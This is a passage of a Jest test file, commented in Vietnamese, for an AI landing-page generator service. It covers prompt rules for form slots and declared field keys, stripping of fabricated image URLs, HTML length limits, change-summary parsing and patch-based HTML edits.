    ).rejects.toMatchObject({ status: 422, message: expect.stringMatching(/2 chỗ trống/) });
  });

  it('đọc công tắc LÚC GỌI, không lúc nạp module — bật rồi tắt ngay trong cùng file test phải đổi hành vi ngay', async () => {
    process.env.AI_LANDING_FORM_MODE = 'form';
    mockGenerateReturns(validSlotHtml);
    const onResult = await aiLandingPageService.generate({ userId: 1, prompt: 'landing khoá học' });
    expect(onResult.html).toBe(validSlotHtml);

    delete process.env.AI_LANDING_FORM_MODE;
    mockGenerateReturns(validSlotHtml);
    await expect(
      aiLandingPageService.generate({ userId: 1, prompt: 'landing khoá học' })
    ).rejects.toMatchObject({ status: 422 });
  });
});

/**
 * PLAN_FORM_DAT_LICH_THANH_TOAN_2026-09-13.md, đính chính 16/09 → PR-5b-2c.
 *
 * editHtml() được trình soạn gọi cả khi HTML CHƯA lưu còn chỗ trống `data-founderai-form-slot`
 * (`useCanvasConversation.js:244-252`, `AI_LANDING_FORM_MODE=form`) — trước bản vá này prompt
 * không hề nhắc gì tới chỗ trống, model "quen tay" viết form/nhét chữ vào lọt qua im lặng cho
 * tới lúc lưu. Chỉ thêm luật khi bản HIỆN TẠI thật sự có chỗ trống — trang không dùng form-mode
 * giữ prompt y hệt trước PR này (luật 2b vẫn thêm trường vào form capture bình thường).
 */
describe('aiLandingPageService.editHtml — prompt giữ chỗ trống chờ Biểu mẫu (PR-5b-2c, đính chính)', () => {
  const htmlWithSlot =
    '<!DOCTYPE html><html lang="vi"><head><script src="https://cdn.tailwindcss.com"></script></head><body>' +
    '<section><div data-founderai-form-slot></div></section>' +
    '</body></html>';

  beforeEach(() => {
    jest.clearAllMocks();
  });

  it('HTML hiện tại có chỗ trống → prompt thêm luật giữ nguyên văn thẻ, không viết form thay thế', async () => {
    generateWithBudget.mockResolvedValue({
      text: JSON.stringify({ title: 'T', html: htmlWithSlot }),
      blockReason: null,
      finishReason: 'STOP',
    });
    await aiLandingPageService.editHtml({
      userId: 1,
      currentHtml: htmlWithSlot,
      instruction: 'Đổi màu nút thành xanh',
    });
    const sentPrompt = generateWithBudget.mock.calls[0][1].parts[0].text;
    expect(sentPrompt).toMatch(/CHỖ TRỐNG CHỜ BIỂU MẪU/);
    expect(sentPrompt).toMatch(/GIỮ NGUYÊN VĂN thẻ đó/);
    expect(sentPrompt).toMatch(/NGOẠI LỆ 2b ở trên.*KHÔNG áp dụng/);
  });

  it('HTML hiện tại KHÔNG có chỗ trống nào → prompt giữ NGUYÊN VĂN như trước PR (rule 2b liền ngay rule 3, không chen luật mới)', async () => {
    generateWithBudget.mockResolvedValue({
      text: JSON.stringify({ title: 'T', html: validFormHtml }),
      blockReason: null,
      finishReason: 'STOP',
    });
    await aiLandingPageService.editHtml({
      userId: 1,
      currentHtml: validFormHtml,
      instruction: 'Đổi màu nút thành xanh',
    });
    const sentPrompt = generateWithBudget.mock.calls[0][1].parts[0].text;
    expect(sentPrompt).not.toMatch(/CHỖ TRỐNG CHỜ BIỂU MẪU/);
    expect(sentPrompt).toMatch(/không đổi tên trường nào khác ngoài trường mới được yêu cầu\.\n3\) Trả về JSON/);
  });
});

/**
 * Câu 3 sếp hỏi 14/09 ("dữ liệu điền vào form sẽ lưu về chỗ nào?") — đường editHtml trước đây
 * không nạp leadFormConfig, AI tự đặt tên ô mới tuỳ ý khi NGOẠI LỆ 2b áp dụng → không khớp
 * customFields đã khai báo → lead.service.js âm thầm bỏ qua lúc nhận bài nộp (gốc ca trang test
 * checkform.founderai.biz).
 */
describe('aiLandingPageService.editHtml — prompt nạp danh sách khoá cf_* đã khai báo (câu 3 sếp hỏi 14/09)', () => {
  const leadFormConfigWith3Keys = {
    fixedFields: { occupation: { visible: false }, interestArea: { visible: false } },
    customFields: [
      { key: 'cf_chuc_vu_ab12', type: 'text', labelVi: 'Chức vụ', required: false, options: [] },
      { key: 'cf_don_vi_cd34', type: 'text', labelVi: 'Đơn vị công tác', required: false, options: [] },
      {
        key: 'cf_khung_gio_ef56',
        type: 'select',
        labelVi: 'Khung giờ hẹn',
        required: true,
        options: [{ value: 'sang', labelVi: 'Sáng' }, { value: 'chieu', labelVi: 'Chiều' }],
      },
    ],
  };

  it('landing có 3 khoá khai báo → chuỗi prompt chứa đủ 3 khoá + luật dùng đúng khoá (áp dụng khi 2b được dùng)', async () => {
    generateWithBudget.mockResolvedValue({
      text: JSON.stringify({ title: 'T', html: validFormHtml }),
      blockReason: null,
      finishReason: 'STOP',
    });
    await aiLandingPageService.editHtml({
      userId: 1,
      currentHtml: validFormHtml,
      instruction: 'Thêm ô Chức vụ vào form',
      leadFormConfig: leadFormConfigWith3Keys,
    });
    const sentPrompt = generateWithBudget.mock.calls[0][1].parts[0].text;
    expect(sentPrompt).toContain('name="cf_chuc_vu_ab12"');
    expect(sentPrompt).toContain('name="cf_don_vi_cd34"');
    expect(sentPrompt).toContain('name="cf_khung_gio_ef56"');
    expect(sentPrompt).toMatch(/DANH SÁCH KHOÁ TRƯỜNG ĐÃ KHAI BÁO/);
    expect(sentPrompt).toMatch(/KHÔNG tự đặt tên trường khác/);
    // Vẫn nằm giữa rule 2b và rule 3 — không phá cấu trúc numbering đã có.
    expect(sentPrompt).toMatch(/không đổi tên trường nào khác ngoài trường mới được yêu cầu\.\n2d\) DANH SÁCH/);
  });

  it('landing KHÔNG khai báo khoá nào (leadFormConfig rỗng) → prompt giữ NGUYÊN VĂN như trước PR', async () => {
    generateWithBudget.mockResolvedValue({
      text: JSON.stringify({ title: 'T', html: validFormHtml }),
      blockReason: null,
      finishReason: 'STOP',
    });
    await aiLandingPageService.editHtml({
      userId: 1,
      currentHtml: validFormHtml,
      instruction: 'Đổi màu nút thành xanh',
      leadFormConfig: { fixedFields: { occupation: { visible: false }, interestArea: { visible: false } }, customFields: [] },
    });
    const sentPrompt = generateWithBudget.mock.calls[0][1].parts[0].text;
    expect(sentPrompt).not.toMatch(/DANH SÁCH KHOÁ TRƯỜNG ĐÃ KHAI BÁO/);
    expect(sentPrompt).toMatch(/không đổi tên trường nào khác ngoài trường mới được yêu cầu\.\n3\) Trả về JSON/);
  });

  it('không truyền leadFormConfig (mặc định null, landing chưa từng resolve được) → prompt giữ NGUYÊN VĂN', async () => {
    generateWithBudget.mockResolvedValue({
      text: JSON.stringify({ title: 'T', html: validFormHtml }),
      blockReason: null,
      finishReason: 'STOP',
    });
    await aiLandingPageService.editHtml({
      userId: 1,
      currentHtml: validFormHtml,
      instruction: 'Đổi màu nút thành xanh',
    });
    const sentPrompt = generateWithBudget.mock.calls[0][1].parts[0].text;
    expect(sentPrompt).not.toMatch(/DANH SÁCH KHOÁ TRƯỜNG ĐÃ KHAI BÁO/);
  });
});

describe('PDF scan inline landing page — C10, C11', () => {
  it('C10: buildModelParts có part inlineData application/pdf data QUJD, đứng sau part text', () => {
    const parts = buildModelParts('prompt text', [], [
      { inlinePdf: true, base64: 'QUJD', originalName: 'a.pdf' },
    ]);
    expect(parts[0]).toEqual({ text: 'prompt text' });
    expect(parts).toContainEqual({
      inlineData: {
        mimeType: 'application/pdf',
        data: 'QUJD',
      },
    });
    const inlineIndex = parts.findIndex((p) => p.inlineData?.mimeType === 'application/pdf');
    expect(inlineIndex).toBeGreaterThan(0);
  });

  it('C11: buildAttachmentPromptBlock chứa "PDF dạng ảnh" và không chứa "[Nội dung tệp"', () => {
    const doc = {
      inlinePdf: true,
      originalName: 'scan.pdf',
      base64: 'QUJD',
    };
    const promptBlock = buildAttachmentPromptBlock([], [doc]);
    expect(promptBlock).toContain('PDF dạng ảnh');
    expect(promptBlock).not.toContain('[Nội dung tệp');
  });
});

describe('Ảnh tham khảo và chốt kiểm URL ảnh bịa (T1 - T10)', () => {
  beforeEach(() => {
    jest.clearAllMocks();
    getContextForLandingAi.mockResolvedValue('');
  });

  it('T1: editHtml với 2 ảnh đính kèm, AI chỉ dùng 1 ảnh trong HTML -> thành công, trả về unusedAssets', async () => {
    const asset1 = { url: 'https://cdn.example.com/img1.png', originalName: 'img1.png' };
    const asset2 = { url: 'https://cdn.example.com/img2.png', originalName: 'img2.png' };
    const htmlUsingOnlyAsset1 = validFormHtml.replace('</body>', `<img src="${asset1.url}"></body>`);
    generateWithBudget.mockResolvedValue({
      text: JSON.stringify({ title: 'T', html: htmlUsingOnlyAsset1 }),
      blockReason: null,
      finishReason: 'STOP',
    });
    const result = await aiLandingPageService.editHtml({
      userId: 1,
      currentHtml: validFormHtml,
      instruction: 'Chỉ dùng ảnh 1',
      assets: [asset1, asset2],
    });
    expect(result.html).toContain(asset1.url);
    expect(result.unusedAssets).toHaveLength(1);
    expect(result.unusedAssets[0].url).toBe(asset2.url);
  });

  it('T2: validateLandingImageUrls với requireAssetsUsed: false -> trả về unusedAssets, không ném LANDING_ASSETS_NOT_USED', () => {
    const asset1 = { url: 'https://cdn.example.com/img1.png' };
    const asset2 = { url: 'https://cdn.example.com/img2.png' };
    const htmlUsingOnlyAsset1 = validFormHtml.replace('</body>', `<img src="${asset1.url}"></body>`);
    const { unusedAssets, allowlistUrls } = validateLandingImageUrls({
      html: htmlUsingOnlyAsset1,
      assets: [asset1, asset2],
      requireAssetsUsed: false,
    });
    expect(unusedAssets).toEqual([asset2]);
    expect(allowlistUrls).toContain(asset1.url);
    expect(allowlistUrls).toContain(asset2.url);
  });

  it('T3: editHtml gọi với đính kèm -> prompt chứa tiêu đề ảnh tham khảo và quy tắc 5a/5b', async () => {
    const asset1 = { url: 'https://cdn.example.com/img1.png', originalName: 'img1.png' };
    const htmlWithImg = validFormHtml.replace('</body>', `<img src="${asset1.url}"></body>`);
    generateWithBudget.mockResolvedValue({
      text: JSON.stringify({ title: 'T', html: htmlWithImg }),
      blockReason: null,
      finishReason: 'STOP',
    });
    await aiLandingPageService.editHtml({
      userId: 1,
      currentHtml: validFormHtml,
      instruction: 'Đổi ảnh',
      assets: [asset1],
    });
    const promptText = generateWithBudget.mock.calls[0][1].parts[0].text;
    expect(promptText).toContain('=== ẢNH ĐÍNH KÈM (có thể là ảnh tham khảo hoặc ảnh cần chèn vào trang) ===');
    expect(promptText).toContain('Ảnh chèn/thay vào trang');
    expect(promptText).toContain('Ảnh tham khảo / ảnh chỉ chỗ sửa');
  });

  it('T4: validateLandingImageUrls phát hiện URL ngoài allowlist -> ném LANDING_FAKE_IMAGE_URL kèm details.fakeImageUrls', () => {
    const htmlWithFake = validFormHtml.replace('</body>', '<img src="https://fake.cdn.com/bad.png"></body>');
    try {
      validateLandingImageUrls({ html: htmlWithFake, assets: [] });
      throw new Error('Should have thrown');
    } catch (err) {
      expect(err.code).toBe('LANDING_FAKE_IMAGE_URL');
      expect(err.status).toBe(422);
      expect(err.details?.fakeImageUrls).toEqual(['https://fake.cdn.com/bad.png']);
    }
  });

  it('T5: generate lần 1 AI bịa URL ảnh -> retry lần 2 sạch -> thành công, log có fakeImageRetry: 1', async () => {
    const logSpy = jest.spyOn(console, 'log').mockImplementation(() => {});
    try {
      const htmlFake = validFormHtml.replace('</body>', '<img src="https://fake.cdn.com/img1.png"></body>');
      const htmlClean = validFormHtml;
      generateWithBudget
        .mockResolvedValueOnce({
          text: JSON.stringify({ title: 'T', html: htmlFake }),
          blockReason: null,
          finishReason: 'STOP',
        })
        .mockResolvedValueOnce({
          text: JSON.stringify({ title: 'T', html: htmlClean }),
          blockReason: null,
          finishReason: 'STOP',
        });

      const result = await aiLandingPageService.generate({
        userId: 1,
        prompt: 'Tạo landing page',
      });
      expect(result.html).toBe(htmlClean);
      expect(generateWithBudget).toHaveBeenCalledTimes(2);

      const retryPrompt = generateWithBudget.mock.calls[1][1].parts[0].text;
      expect(retryPrompt).toContain('LƯU Ý ĐẶC BIỆT');
      expect(retryPrompt).toContain('https://fake.cdn.com/img1.png');

      const lifecycleLogs = logSpy.mock.calls
        .map((c) => c[0])
        .filter((msg) => typeof msg === 'string' && msg.includes('[LandingAI] done'));
      expect(lifecycleLogs.length).toBeGreaterThan(0);
      expect(lifecycleLogs.some((msg) => msg.includes('fakeImageRetry=1'))).toBe(true);
    } finally {
      logSpy.mockRestore();
    }
  });

  it('T6: generate lần 1 bịa ảnh -> retry lần 2 VẪN bịa ảnh -> stripDisallowedImages thành công, có strippedImageUrls', async () => {
    const logSpy = jest.spyOn(console, 'log').mockImplementation(() => {});
    try {
      const htmlFake = validFormHtml.replace('</body>', '<img src="https://fake.cdn.com/img1.png"></body>');
      generateWithBudget.mockResolvedValue({
        text: JSON.stringify({ title: 'T', html: htmlFake }),
        blockReason: null,
        finishReason: 'STOP',
      });

      const result = await aiLandingPageService.generate({
        userId: 1,
        prompt: 'Tạo landing page',
      });
      expect(result.html).not.toContain('https://fake.cdn.com/img1.png');
      expect(result.strippedImageUrls).toEqual(['https://fake.cdn.com/img1.png']);
      expect(generateWithBudget).toHaveBeenCalledTimes(2);

      const lifecycleLogs = logSpy.mock.calls
        .map((c) => c[0])
        .filter((msg) => typeof msg === 'string' && msg.includes('[LandingAI] done'));
      expect(lifecycleLogs.length).toBeGreaterThan(0);
      expect(lifecycleLogs.some((msg) => msg.includes('strippedImages=1'))).toBe(true);
    } finally {
      logSpy.mockRestore();
    }
  });

  it('T7: stripDisallowedImages gỡ thẻ <img> và <source> ngoài allowlist, giữ nguyên ảnh hợp lệ', () => {
    const allowUrl = 'https://cdn.example.com/valid.png';
    const fakeImgUrl = 'https://fake.cdn.com/fake.png';
    const fakeSourceUrl = 'https://fake.cdn.com/fake.webp';
    const html = `<div>
      <img src="${allowUrl}" alt="valid" />
      <img src="${fakeImgUrl}" alt="fake" />
      <picture>
        <source srcset="${fakeSourceUrl}" type="image/webp">
        <img src="${allowUrl}" alt="pic">
      </picture>
    </div>`;

    const { html: strippedHtml, stripped } = stripDisallowedImages(html, [allowUrl]);
    expect(stripped).toContain(fakeImgUrl);
    expect(stripped).toContain(fakeSourceUrl);
    expect(strippedHtml).toContain(allowUrl);
    expect(strippedHtml).not.toContain(fakeImgUrl);
    expect(strippedHtml).not.toContain(fakeSourceUrl);
  });

  it('T7b (review): stripDisallowedImages GIỮ <img> src tương đối và data:image/svg+xml — chốt 2 chưa bao giờ coi đó là bịa', () => {
    const relativeImg = '<img src="/lp-assets/uploads/1/landing/local.png" alt="rel" />';
    const dataImg = '<img src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=" alt="icon" />';
    const fakeImg = '<img src="https://fake.cdn.com/fake.png" alt="fake" />';
    const html = `<div>${relativeImg}${dataImg}${fakeImg}</div>`;

    const { html: strippedHtml, stripped } = stripDisallowedImages(html, new Set());
    expect(stripped).toEqual(['https://fake.cdn.com/fake.png']);
    expect(strippedHtml).toContain(relativeImg);
    expect(strippedHtml).toContain(dataImg);
    expect(strippedHtml).not.toContain('fake.cdn.com');
  });

  it('T8: editHtml lần 1 bịa ảnh -> retry lần 2 VẪN bịa ảnh -> tự động gỡ ảnh bịa, trả về strippedImageUrls', async () => {
    const fakeUrl = 'https://fake.cdn.com/fake-edit.png';
    const htmlFake = validFormHtml.replace('</body>', `<img src="${fakeUrl}"></body>`);
    generateWithBudget.mockResolvedValue({
      text: JSON.stringify({ title: 'T', html: htmlFake }),
      blockReason: null,
      finishReason: 'STOP',
    });

    const result = await aiLandingPageService.editHtml({
      userId: 1,
      currentHtml: validFormHtml,
      instruction: 'Thêm ảnh',
      assets: [],
    });
    expect(result.html).not.toContain(fakeUrl);
    expect(result.strippedImageUrls).toEqual([fakeUrl]);
    expect(generateWithBudget).toHaveBeenCalledTimes(2);
  });

  /**
   * Trang ~80.000 ký tự mất ~66 giây một lượt (đo production 30/09); sinh lại lần 2 vượt trần
   * 100 giây của Cloudflare → trình duyệt nhận 524 dù backend sửa xong. Đồng hồ giả: mỗi lượt gọi
   * model "tốn" firstRunMs.
   */
  const editWithFakeImageAfter = async (firstRunMs) => {
    const fakeUrl = 'https://fake.cdn.com/fake-slow.png';
    let now = 1_000_000;
    const nowSpy = jest.spyOn(Date, 'now').mockImplementation(() => now);
    const logSpy = jest.spyOn(console, 'log').mockImplementation(() => {});
    generateWithBudget.mockImplementation(async () => {
      now += firstRunMs;
      return {
        text: JSON.stringify({ title: 'T', html: validFormHtml.replace('</body>', `<img src="${fakeUrl}"></body>`) }),
        blockReason: null,
        finishReason: 'STOP',
      };
    });
    try {
      const result = await aiLandingPageService.editHtml({
        userId: 1,
        currentHtml: validFormHtml,
        instruction: 'Thêm ảnh',
        assets: [],
      });
      const doneLog = logSpy.mock.calls.map((c) => c[0]).find((m) => typeof m === 'string' && m.includes('[LandingAI] done'));
      return { result, fakeUrl, doneLog };
    } finally {
      nowSpy.mockRestore();
      logSpy.mockRestore();
    }
  };

  it('T9: editHtml lượt đầu chậm (2 lượt > EDIT_TIME_BUDGET_MS) bịa ảnh → KHÔNG sinh lại, gỡ ảnh bịa ngay', async () => {
    const { result, fakeUrl, doneLog } = await editWithFakeImageAfter(EDIT_TIME_BUDGET_MS / 2 + 1);
    expect(generateWithBudget).toHaveBeenCalledTimes(1);
    expect(result.html).not.toContain(fakeUrl);
    expect(result.strippedImageUrls).toEqual([fakeUrl]);
    expect(doneLog).toContain('outcome=success');
    expect(doneLog).toContain('fakeImageRetry=0');
    expect(doneLog).toContain('strippedImages=1');
  });

  it('T10: editHtml lượt đầu vừa đúng nửa ngân sách → vẫn sinh lại như cũ (2 lượt), log fakeImageRetry=1', async () => {
    const { result, fakeUrl, doneLog } = await editWithFakeImageAfter(EDIT_TIME_BUDGET_MS / 2);
    expect(generateWithBudget).toHaveBeenCalledTimes(2);
    expect(result.strippedImageUrls).toEqual([fakeUrl]);
    expect(doneLog).toContain('fakeImageRetry=1');
  });
});

describe('aiLandingPageService.editHtml — trần độ dài HTML hiện tại (đường viết-lại-cả-trang, AI_LANDING_EDIT_MODE=full)', () => {
  beforeEach(() => {
    jest.clearAllMocks();
  });

  // Đệm validFormHtml tới ĐÚNG n ký tự ('<p>' + '</p>' = 7 ký tự).
  const htmlOfLength = (n) => validFormHtml.replace('</body>', `<p>${'a'.repeat(n - validFormHtml.length - 7)}</p></body>`);

  it('trang đúng bằng trần (80.000 ký tự) → gọi AI sửa bình thường', async () => {
    await withEditMode('full', async () => {
      const html = htmlOfLength(MAX_FULL_REWRITE_HTML_CHARS);
      expect(html).toHaveLength(80000);
      mockGenerateReturns(html);
      const result = await aiLandingPageService.editHtml({ userId: 1, currentHtml: html, instruction: 'Tinh gọn' });
      expect(generateWithBudget).toHaveBeenCalledTimes(1);
      expect(result.html).toBe(html);
    });
  });

  it('trang vượt trần 1 ký tự → 400 báo đúng độ dài + trần, KHÔNG gọi AI', async () => {
    await withEditMode('full', async () => {
      await expect(aiLandingPageService.editHtml({
        userId: 1,
        currentHtml: htmlOfLength(MAX_FULL_REWRITE_HTML_CHARS + 1),
        instruction: 'Tinh gọn',
      })).rejects.toMatchObject({
        status: 400,
        message: expect.stringContaining('80.001 ký tự, giới hạn 80.000 ký tự'),
      });
      expect(generateWithBudget).not.toHaveBeenCalled();
    });
  });
});

/**
 * PLAN_LANDING_TU_KIEM_HIEN_THI_TU_SUA mục 10.3 + 10.5 — changeSummary tiếng người từ chính AI, và
 * luật BỐ CỤC AN TOÀN ở cả prompt SINH lẫn prompt SỬA (phòng bệnh; bộ đo ở trình duyệt là chữa bệnh).
 */
describe('aiLandingPageService — changeSummary + BỐ CỤC AN TOÀN (PR-2 landing tự kiểm)', () => {
  const returnsSummary = (changeSummary, extra = {}) =>
    generateWithBudget.mockResolvedValue({
      text: JSON.stringify({ title: 'T', html: validFormHtml, ...(changeSummary !== undefined ? { changeSummary } : {}), ...extra }),
      blockReason: null,
      finishReason: 'STOP',
    });
  const edit = (over = {}) =>
    aiLandingPageService.editHtml({ userId: 1, currentHtml: validFormHtml, instruction: 'Sửa bố cục', ...over });

  beforeEach(() => {
    jest.clearAllMocks();
    getContextForLandingAi.mockResolvedValue('');
  });

  it('prompt SINH có luật BỐ CỤC AN TOÀN (grid-cols-[9rem_1fr]) và KHÔNG đòi changeSummary', async () => {
    mockGenerateReturns(validFormHtml);
    await aiLandingPageService.generate({ userId: 1, prompt: 'landing khoá học' });
    const sentPrompt = generateWithBudget.mock.calls[0][1].parts[0].text;
    expect(sentPrompt).toContain('BỐ CỤC AN TOÀN: không đặt chữ bằng absolute với toạ độ âm');
    expect(sentPrompt).toContain('grid grid-cols-[9rem_1fr] gap-6');
    expect(sentPrompt).toContain('w-36 shrink-0');
    expect(sentPrompt).toContain('không whitespace-nowrap');
    expect(sentPrompt).not.toContain('changeSummary');
    // chèn NGAY SAU quy tắc 4 (styling), trước quy tắc 5, không làm lệch đánh số
    expect(sentPrompt).toMatch(/keyframe animation nếu thật sự cần\.\n4b\) BỐ CỤC AN TOÀN[^\n]*\n5\) Không dùng JavaScript/);
  });

  it('prompt SỬA có luật BỐ CỤC AN TOÀN (chỉ cho phần thêm/sửa) và đòi changeSummary tiếng người', async () => {
    // Prompt viết-lại-cả-trang (đường dự phòng + công tắc full): khoá nguyên byte dưới AI_LANDING_EDIT_MODE=full.
    returnsSummary('Đã nới cột ngày ở phần Dòng thời gian để năm không bị che');
    await withEditMode('full', () => edit());
    const sentPrompt = generateWithBudget.mock.calls[0][1].parts[0].text;
    expect(sentPrompt).toContain('grid grid-cols-[9rem_1fr] gap-6');
    expect(sentPrompt).toContain('BỐ CỤC AN TOÀN');
    expect(sentPrompt).toMatch(/áp dụng cho phần bạn THÊM hoặc SỬA; KHÔNG viết lại phần không được yêu cầu/);
    expect(sentPrompt).toContain('{ "title": "...", "html": "...", "changeSummary": "..." }');
    expect(sentPrompt).toContain('Ba khóa: "title" (string), "html" (string) và "changeSummary" (string).');
    expect(sentPrompt).toMatch(/MỘT câu tiếng Việt tối đa 160 ký tự, viết cho người KHÔNG rành kỹ thuật/);
    expect(sentPrompt).toContain('Đã nới cột ngày ở phần Dòng thời gian để năm không bị che');
    expect(sentPrompt).toMatch(/TUYỆT ĐỐI không nhắc class, CSS, pixel, tên thẻ HTML hay mã nguồn/);
    expect(sentPrompt).toContain('{"title":"...","html":"...","changeSummary":"..."}');
    // Rule 2b vẫn liền ngay rule 3 như trước — test "prompt giữ nguyên văn" phía trên không được vỡ
    expect(sentPrompt).toMatch(/không đổi tên trường nào khác ngoài trường mới được yêu cầu\.\n3\) Trả về JSON/);
  });

  it('locale en: changeSummary dặn viết tiếng Anh, ví dụ tiếng Anh', async () => {
    returnsSummary('Widened the date column');
    await edit({ contentLocale: 'en' });
    const sentPrompt = generateWithBudget.mock.calls[0][1].parts[0].text;
    expect(sentPrompt).toMatch(/MỘT câu tiếng Anh tối đa 160 ký tự/);
    expect(sentPrompt).toContain('Widened the date column in the Timeline section so the year is no longer covered');
  });

  it('parse: changeSummary là string → trả về trong kết quả', async () => {
    returnsSummary('Đã nới cột ngày ở phần Dòng thời gian để năm không bị che');
    const result = await edit();
    expect(result.changeSummary).toBe('Đã nới cột ngày ở phần Dòng thời gian để năm không bị che');
    expect(result.html).toBe(validFormHtml);
  });

  it('parse: chứa thẻ HTML → bỏ thẻ, gộp khoảng trắng; quá 200 ký tự → cắt 200', async () => {
    returnsSummary('Đã <b>nới</b>\n  cột   ngày');
    expect((await edit()).changeSummary).toBe('Đã nới cột ngày');
    returnsSummary('Đã sửa '.repeat(100));
    expect((await edit()).changeSummary).toHaveLength(200);
  });

  it.each([
    ['thiếu khoá', undefined],
    ['là object', { a: 1 }],
    ['là số', 42],
    ['là mảng', ['Đã sửa']],
    ['rỗng sau khi bỏ thẻ', '<p></p>'],
    ['lộ chuyện kỹ thuật (pr-4)', 'Đã thêm pr-4 vào cột ngày'],
    ['lộ chuyện kỹ thuật (px)', 'Đã tăng khoảng cách thêm 16px'],
  ])('parse: changeSummary %s → KHÔNG có khoá changeSummary trong kết quả', async (_label, value) => {
    returnsSummary(value);
    const result = await edit();
    expect(result).not.toHaveProperty('changeSummary');
    expect(result.html).toBe(validFormHtml);
  });

  it('đường fallback không JSON (model trả HTML trần) → không có changeSummary, không lỗi', async () => {
    generateWithBudget.mockResolvedValue({ text: `Đây là trang:\n\`\`\`html\n${validFormHtml}\n\`\`\``, blockReason: null, finishReason: 'STOP' });
    const result = await edit();
    expect(result).not.toHaveProperty('changeSummary');
    expect(result.html).toBe(validFormHtml);
  });

  it('nhánh tự gỡ ảnh bịa vẫn mang changeSummary của lượt sinh', async () => {
    const fakeUrl = 'https://fake.cdn.com/fake-summary.png';
    const htmlFake = validFormHtml.replace('</body>', `<img src="${fakeUrl}"></body>`);
    generateWithBudget.mockResolvedValue({
      text: JSON.stringify({ title: 'T', html: htmlFake, changeSummary: 'Đã thêm ảnh vào cuối trang' }),
      blockReason: null,
      finishReason: 'STOP',
    });
    const result = await edit({ instruction: 'Thêm ảnh' });
    expect(result.strippedImageUrls).toEqual([fakeUrl]);
    expect(result.changeSummary).toBe('Đã thêm ảnh vào cuối trang');
  });

  it('lượt tự sửa: metadata gửi aiUsageMeter có autoLayoutFix=true; lượt thường KHÔNG có khoá này', async () => {
    returnsSummary('Đã sửa');
    await edit({ autoLayoutFix: true, layoutFindingsCount: 2 });
    expect(generateWithBudget.mock.calls[0][1].metadata).toMatchObject({ mode: 'edit', autoLayoutFix: true });
    returnsSummary('Đã sửa');
    await withEditMode('full', () => edit());
    expect(generateWithBudget.mock.calls[1][1].metadata).toEqual({ actorUserId: 1, mode: 'edit' });
  });

  it('log vòng đời: lượt tự sửa có autoLayoutFix=1 findings=<n> ngay sau mode=edit; lượt thường giữ nguyên', async () => {
    const logSpy = jest.spyOn(console, 'log').mockImplementation(() => {});
    try {
      returnsSummary('Đã sửa');
      await edit({ autoLayoutFix: true, layoutFindingsCount: 2 });
      const auto = logSpy.mock.calls.map(([line]) => line);
      expect(auto[0]).toMatch(/^\[LandingAI\] start mode=edit autoLayoutFix=1 findings=2 ms=\d+ /);
      expect(auto[1]).toMatch(/^\[LandingAI\] done mode=edit autoLayoutFix=1 findings=2 outcome=success ms=\d+ /);
      // lệnh đếm lượt sửa của nghiệm thu N4 vẫn khớp cả hai loại
      expect(auto[0]).toMatch(/^\[LandingAI\] start mode=edit/);

      logSpy.mockClear();
      returnsSummary('Đã sửa');
      await edit();
      const normal = logSpy.mock.calls.map(([line]) => line);
      expect(normal[0]).toMatch(/^\[LandingAI\] start mode=edit ms=\d+ finishReason=unknown promptChars=\d+ htmlChars=0$/);
      expect(normal[0]).not.toContain('autoLayoutFix');
    } finally {
      logSpy.mockRestore();
    }
  });
});

/**
 * PLAN_SUA_LANDING_THEO_DOAN_2026-09-30 — editHtml sửa theo ĐOẠN (bản vá {find, replace}), dự phòng
 * viết lại cả trang, công tắc AI_LANDING_EDIT_MODE, log strategy/patchEdits/patchFail.
 */
describe('aiLandingPageService.editHtml — sửa theo đoạn (bản vá)', () => {
  const baseHtml = validFormHtml.replace('<body>', '<body><h1>Khoá học Alpha</h1><p>Giá 99$ mỗi tháng</p>');
  const patchedHtml = baseHtml.replace('<h1>Khoá học Alpha</h1>', '<h1>Khoá học Beta</h1>');
  const goodEdit = { find: '<h1>Khoá học Alpha</h1>', replace: '<h1>Khoá học Beta</h1>' };

  // Đệm baseHtml tới ĐÚNG n ký tự.
  const htmlOfLength = (n) => baseHtml.replace('</body>', `<p>${'a'.repeat(n - baseHtml.length - 7)}</p></body>`);

  const patchResponse = (edits, extra = {}) => ({
    text: JSON.stringify({ title: 'T', edits, changeSummary: 'Đã đổi tên khoá học', ...extra }),
    blockReason: null,
    finishReason: 'STOP',
  });
  const fullResponse = (html) => ({
    text: JSON.stringify({ title: 'T', html, changeSummary: 'Đã đổi tên khoá học' }),
    blockReason: null,
    finishReason: 'STOP',
  });
  const promptOf = (callIndex) => generateWithBudget.mock.calls[callIndex][1].parts[0].text;
  const edit = (over = {}) =>
    aiLandingPageService.editHtml({ userId: 1, currentHtml: baseHtml, instruction: 'Đổi tên khoá học', ...over });
  const doneLogOf = (logSpy) =>
    logSpy.mock.calls.map((c) => c[0]).find((m) => typeof m === 'string' && m.startsWith('[LandingAI] done'));

  let logSpy;
  beforeEach(() => {
    jest.clearAllMocks();
    generateWithBudget.mockReset();
    logSpy = jest.spyOn(console, 'log').mockImplementation(() => {});
    jest.spyOn(console, 'warn').mockImplementation(() => {});
  });
  afterEach(() => {
    logSpy.mockRestore();
    console.warn.mockRestore();
    delete process.env.AI_LANDING_EDIT_MODE;
  });

  it('vá 1 edit hợp lệ → 1 lần gọi, đúng 1 chỗ đổi, prompt vá, log strategy=patch patchEdits=1', async () => {
    generateWithBudget.mockResolvedValue(patchResponse([goodEdit]));
    // Đóng băng đồng hồ: timeoutMs = ngân sách − thời gian đã trôi, đồng hồ thật lệch vài ms là đỏ giả.
    const nowSpy = jest.spyOn(Date, 'now').mockReturnValue(1_000_000);
    let result;
    try {
      result = await edit();
    } finally {
      nowSpy.mockRestore();
    }
    expect(generateWithBudget).toHaveBeenCalledTimes(1);
    expect(result.html).toBe(patchedHtml);
    expect(result.title).toBe('T');
    expect(result.changeSummary).toBe('Đã đổi tên khoá học');
    const prompt = promptOf(0);
    expect(prompt).toContain('"edits"');
    expect(prompt).not.toContain('"html" là TOÀN BỘ');
    expect(doneLogOf(logSpy)).toMatch(/ htmlChars=\d+ strategy=patch patchEdits=1$/);
    const opts = generateWithBudget.mock.calls[0][1];
    expect(opts.timeoutMs).toBe(EDIT_TIME_BUDGET_MS);
    expect(opts.maxOutputTokens).toBe(32768);
    expect(opts.metadata).toEqual({ actorUserId: 1, mode: 'edit', strategy: 'patch' });
  });

  it('prompt vá có luật BỐ CỤC AN TOÀN, changeSummary tiếng người, khoá "edits"', async () => {
    generateWithBudget.mockResolvedValue(patchResponse([goodEdit]));
    await edit();
    const sentPrompt = promptOf(0);
